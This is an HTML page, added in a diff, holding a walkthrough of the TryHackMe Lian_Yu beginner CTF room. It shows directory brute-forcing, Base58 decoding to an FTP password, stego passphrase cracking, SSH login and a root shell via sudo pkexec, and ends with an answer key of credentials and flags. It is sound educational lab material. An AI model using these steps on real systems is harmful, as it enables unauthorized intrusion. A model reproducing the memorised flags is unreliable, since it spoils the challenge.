@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Lian_Yu Writeup</title>
+  <style>
+    :root {
+      --bg: #0c1222;
+      --panel: #121a2f;
+      --panel-soft: #17213a;
+      --text: #ecf2ff;
+      --muted: #a8b3cc;
+      --accent: #46d369;
+      --accent-2: #61dafb;
+      --warn: #f6c177;
+      --code: #080d18;
+      --border: rgba(255, 255, 255, 0.12);
+      --shadow: rgba(0, 0, 0, 0.35);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(70, 211, 105, 0.18), transparent 28rem),
+        radial-gradient(circle at top right, rgba(97, 218, 251, 0.14), transparent 26rem),
+        var(--bg);
+    }
+
+    a {
+      color: var(--accent-2);
+    }
+
+    .hero {
+      padding: 4rem 1.25rem 3rem;
+      text-align: center;
+      border-bottom: 1px solid var(--border);
+      background: linear-gradient(180deg, rgba(18, 26, 47, 0.65), rgba(18, 26, 47, 0));
+    }
+
+    .hero h1 {
+      margin: 0;
+      font-size: clamp(2.2rem, 8vw, 5rem);
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .hero p {
+      max-width: 760px;
+      margin: 1rem auto 0;
+      color: var(--muted);
+      font-size: 1.1rem;
+    }
+
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-top: 1.5rem;
+    }
+
+    .badge {
+      padding: 0.4rem 0.8rem;
+      border: 1px solid var(--border);
+      border-radius: 999px;
+      color: var(--text);
+      background: rgba(255, 255, 255, 0.06);
+      font-size: 0.9rem;
+    }
+
+    main {
+      width: min(1120px, calc(100% - 2rem));
+      margin: 0 auto;
+      padding: 2rem 0 4rem;
+    }
+
+    .notice,
+    .card,
+    .timeline-item,
+    .answers {
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      background: rgba(18, 26, 47, 0.82);
+      box-shadow: 0 18px 50px var(--shadow);
+    }
+
+    .notice {
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.5rem;
+      border-left: 4px solid var(--warn);
+    }
+
+    .notice strong {
+      color: var(--warn);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0 2rem;
+    }
+
+    .card {
+      padding: 1.25rem;
+    }
+
+    .card h3 {
+      margin: 0 0 0.5rem;
+      color: var(--accent);
+    }
+
+    .card p,
+    .timeline-item p,
+    .answers p {
+      color: var(--muted);
+    }
+
+    section {
+      margin-top: 2rem;
+    }
+
+    h2 {
+      margin: 0 0 1rem;
+      font-size: 1.8rem;
+    }
+
+    .timeline {
+      display: grid;
+      gap: 1rem;
+    }
+
+    .timeline-item {
+      padding: 1.35rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .timeline-item::before {
+      content: attr(data-step);
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      color: rgba(255, 255, 255, 0.08);
+      font-weight: 800;
+      font-size: 3rem;
+      line-height: 1;
+    }
+
+    .timeline-item h3 {
+      margin: 0 0 0.75rem;
+      color: var(--accent);
+      padding-right: 4rem;
+    }
+
+    pre {
+      margin: 1rem 0;
+      padding: 1rem;
+      overflow-x: auto;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      background: var(--code);
+    }
+
+    code {
+      font-family: "Cascadia Code", "Fira Code", Consolas, monospace;
+      color: #d7e4ff;
+      font-size: 0.95rem;
+    }
+
+    .inline-code {
+      padding: 0.15rem 0.35rem;
+      border-radius: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--text);
+      font-family: Consolas, monospace;
+    }
+
+    .answers {
+      padding: 1.35rem;
+      background: linear-gradient(135deg, rgba(70, 211, 105, 0.12), rgba(18, 26, 47, 0.86));
+    }
+
+    .answers table {
+      width: 100%;
+      border-collapse: collapse;
+      overflow: hidden;
+      border-radius: 12px;
+    }
+
+    .answers th,
+    .answers td {
+      padding: 0.9rem;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+
+    .answers th {
+      color: var(--accent);
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    footer {
+      padding: 2rem 1rem;
+      color: var(--muted);
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+
+    @media (max-width: 820px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+
+      .hero {
+        padding-top: 3rem;
+      }
+
+      .answers {
+        overflow-x: auto;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="hero">
+    <h1>Lian_Yu</h1>
+    <p>
+      A TryHackMe beginner CTF walkthrough covering enumeration, web discovery,
+      FTP access, steganography, SSH access, and privilege escalation.
+    </p>
+    <div class="badges" aria-label="Room summary">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Theme: Arrowverse</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>Spoiler warning:</strong> this writeup contains commands, credentials,
+      filenames, and flags for the Lian_Yu room. Use it only for authorized lab
+      practice and learning.
+    </div>
+
+    <section class="grid" aria-label="Skills practiced">
+      <article class="card">
+        <h3>Enumeration</h3>
+        <p>Identify exposed services, discover web directories, and inspect page source for hidden hints.</p>
+      </article>
+      <article class="card">
+        <h3>Credential Discovery</h3>
+        <p>Decode a Base58 ticket, log in to FTP, and extract hidden data from downloaded files.</p>
+      </article>
+      <article class="card">
+        <h3>Privilege Escalation</h3>
+        <p>Use sudo permissions for <span class="inline-code">pkexec</span> to spawn a root shell.</p>
+      </article>
+    </section>
+
+    <section>
+      <h2>Walkthrough</h2>
+      <div class="timeline">
+        <article class="timeline-item" data-step="01">
+          <h3>Initial scan</h3>
+          <p>
+            Start with service enumeration. The important open ports are FTP, SSH,
+            HTTP, and RPC.
+          </p>
+          <pre><code>nmap -sC -sV -p- &lt;target-ip&gt;</code></pre>
+          <p>Expected services:</p>
+          <pre><code>21/tcp  open  ftp     vsftpd 3.0.2
+22/tcp  open  ssh     OpenSSH 6.7p1
+80/tcp  open  http    Apache httpd
+111/tcp open  rpcbind</code></pre>
+        </article>
+
+        <article class="timeline-item" data-step="02">
+          <h3>Web enumeration</h3>
+          <p>
+            Browse the HTTP service, then brute-force directories. The first useful
+            path is <span class="inline-code">/island</span>.
+          </p>
+          <pre><code>gobuster dir -u http://&lt;target-ip&gt; \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+          <p>
+            Viewing the page or source reveals the code word
+            <span class="inline-code">vigilante</span>, which later works as the FTP
+            username. A second directory scan under <span class="inline-code">/island</span>
+            reveals <span class="inline-code">/2100</span>.
+          </p>
+          <pre><code>gobuster dir -u http://&lt;target-ip&gt;/island \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+        </article>
+
+        <article class="timeline-item" data-step="03">
+          <h3>Find the ticket</h3>
+          <p>
+            The <span class="inline-code">/island/2100</span> page hints at a ticket.
+            Scan for files with the <span class="inline-code">.ticket</span> extension.
+          </p>
+          <pre><code>gobuster dir -u http://&lt;target-ip&gt;/island/2100 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x ticket</code></pre>
+          <p>
+            This reveals <span class="inline-code">green_arrow.ticket</span>. Its
+            content is Base58 encoded and decodes to the FTP password.
+          </p>
+          <pre><code>echo '&lt;base58-ticket-value&gt;' | base58 -d</code></pre>
+          <p>
+            Decoded password: <span class="inline-code">!#th3h00d</span>
+          </p>
+        </article>
+
+        <article class="timeline-item" data-step="04">
+          <h3>FTP access</h3>
+          <p>
+            Use the discovered username and password to log in to FTP. Download the
+            available files and check whether you can move up to see other user
+            directories.
+          </p>
+          <pre><code>ftp &lt;target-ip&gt;
+Name: vigilante
+Password: !#th3h00d
+
+ftp&gt; ls -la
+ftp&gt; mget *
+ftp&gt; cd ..
+ftp&gt; ls -la
+ftp&gt; get .other_user</code></pre>
+          <p>
+            The FTP area provides images for steganography and points to another
+            user: <span class="inline-code">slade</span>.
+          </p>
+        </article>
+
+        <article class="timeline-item" data-step="05">
+          <h3>Steganography and SSH password</h3>
+          <p>
+            Inspect the downloaded images. The useful one is
+            <span class="inline-code">aa.jpg</span>. Extract the embedded content
+            with <span class="inline-code">steghide</span> or crack the stego
+            passphrase with <span class="inline-code">stegseek</span>.
+          </p>
+          <pre><code>stegseek aa.jpg /usr/share/wordlists/rockyou.txt
+steghide extract -sf aa.jpg</code></pre>
+          <p>
+            The extracted archive leads to files named
+            <span class="inline-code">passwd.txt</span> and
+            <span class="inline-code">shado</span>. Read
+            <span class="inline-code">shado</span> to recover the SSH password:
+            <span class="inline-code">M3tahuman</span>.
+          </p>
+        </article>
+
+        <article class="timeline-item" data-step="06">
+          <h3>SSH and user flag</h3>
+          <p>
+            Combine the username discovered from FTP with the SSH password from the
+            stego extraction.
+          </p>
+          <pre><code>ssh slade@&lt;target-ip&gt;
+Password: M3tahuman
+
+slade@LianYu:~$ ls
+slade@LianYu:~$ cat user.txt</code></pre>
+          <p>
+            User flag:
+            <span class="inline-code">THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}</span>
+          </p>
+        </article>
+
+        <article class="timeline-item" data-step="07">
+          <h3>Privilege escalation</h3>
+          <p>
+            Check sudo privileges. The user can run
+            <span class="inline-code">pkexec</span> as root, which can be used to
+            spawn a privileged shell.
+          </p>
+          <pre><code>sudo -l
+sudo /usr/bin/pkexec /bin/sh
+
+# id
+# cat /root/root.txt</code></pre>
+          <p>
+            Root flag:
+            <span class="inline-code">THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}</span>
+          </p>
+        </article>
+      </div>
+    </section>
+
+    <section class="answers">
+      <h2>Answer Summary</h2>
+      <p>Quick reference for the room questions.</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Question</th>
+            <th>Answer</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>What is the web directory you found?</td>
+            <td><code>2100</code></td>
+          </tr>
+          <tr>
+            <td>What is the file name you found?</td>
+            <td><code>green_arrow.ticket</code></td>
+          </tr>
+          <tr>
+            <td>What is the FTP password?</td>
+            <td><code>!#th3h00d</code></td>
+          </tr>
+          <tr>
+            <td>What is the file name with SSH password?</td>
+            <td><code>shado</code></td>
+          </tr>
+          <tr>
+            <td>user.txt</td>
+            <td><code>THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}</code></td>
+          </tr>
+          <tr>
+            <td>root.txt</td>
+            <td><code>THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+  </main>
+
+  <footer>
+    <p>Prepared as an educational CTF writeup for https://tryhackme.com/room/lianyu.</p>
+  </footer>
+</body>
+</html>
